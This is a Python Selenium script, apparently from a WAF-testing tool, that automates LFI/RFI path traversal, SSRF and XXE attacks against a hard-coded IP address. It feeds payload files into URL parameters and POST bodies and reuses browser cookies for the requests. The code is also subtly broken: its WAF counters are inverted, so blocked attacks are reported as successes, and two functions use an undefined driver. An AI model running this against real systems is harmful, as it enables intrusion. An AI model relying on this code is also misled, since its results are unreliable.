from main import init
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
import requests
from utility import get_cookie_from_driver, calculate_file_lines

"""

"""
def execute(driver, target_url):
    # Start to attack
    lfi_rfi_attack(driver, target_url)

def lfi_rfi_attack(driver, target_url):

    payload_path = './Payloads/LFI_RFI_Injections.txt'

    # Adjust URL Injection Speed if needed, Lower is quicker
    injection_speed = 1

    # Calculate Amount Of PayLoads
    lines = calculate_file_lines(payload_path)
    blocked_by_waf_counter = 0


    # Getting Payloads and starting to inject into WAF
    with open(payload_path, 'r', encoding='utf-8') as lfi_payloads:

        for payload in lfi_payloads:
            attack_url_page = target_url + f'directory_traversal_2.php?directory={payload}'
            time.sleep(injection_speed)
            driver.get(attack_url_page)
            try:
                # Catch WAF Blocking page
                waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                if "403 Forbidden" == waf_block_message:
                    blocked_by_waf_counter += 1
            except NoSuchElementException:
                print('[+] Path Traversal Attack passed: ', payload.strip())

    # for file in file_list:
    #     attack_url_page = target_url + f'directory_traversal_1.php?page={file}'
    #     driver.get(attack_url_page)
    #     try:
    #         # Catch WAF Blocking page
    #         waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
    #         if "403 Forbidden" == waf_block_message:
    #             blocked_by_waf_counter += 1
    #     except NoSuchElementException:
    #         print('[+] Path Traversal Attack passed: ', file)

        time.sleep(injection_speed)
        print(f"\n[!] ~~~Local File Inclusion / Remote File Inclusion [LFI / RFI] Results~~~ [!]")
        print('Attacks Blocked by WAF: ', lines - blocked_by_waf_counter)
        print(f"[+] Total Successful Attacks: ", blocked_by_waf_counter)

    driver.quit()

def ssrf_attack():
    """
        URL: http://34.192.19.10/rlfi.php?language=lang_en.php&action=go
        Hacked_URL: http://34.192.19.10/rlfi.php?language=./evil/ssrf-1.txt&action=go?ip=34.192.19.10
    """

    print('[ + ] Starting SSRF Attack: ')
    target_url = 'http://34.192.19.10/rlfi.php?language=lang_en.php&action=go'
    driver.get(target_url)
    time.sleep(3)

    try:
        driver.get('http://34.192.19.10/rlfi.php?language=./evil/ssrf-1.txt&action=go?ip=34.192.19.10')
        WebDriverWait(driver, 5).until(EC.alert_is_present())

        # switch_to.alert for switching to alert and accept
        alert = driver.switch_to.alert
        if alert:
            print('[ + ] SSRF Passed')
            alert.accept()

    except TimeoutException:
        print("alert does not Exist in page")

    driver.quit()

def xxe_attack():
    print('[+] XXE Attack Start')
    target_url = 'http://34.192.19.10/xxe-1.php'
    driver.get(target_url)

    time.sleep(5)  # Wait Cookies To load
    driver_cookies = get_cookie_from_driver(driver)

    with open('Payloads/XXE_Payloads.txt', 'r', encoding='utf-8') as xxe_payloads:
        payloads = xxe_payloads.read().split('\n\n')

        for payload in payloads:
            res = requests.post('http://34.192.19.10/xxe-2.php', cookies=driver_cookies, data=payload)
            if res.text.split('\n')[-1] == 'An error occured!':
                print('[+] XXE Attack Passed: ', payload)


        # for row in xxe_payloads.read().split('*'):
        #     print(row)
    driver.quit()
# lfi_rfi_attack()
# xxe_attack()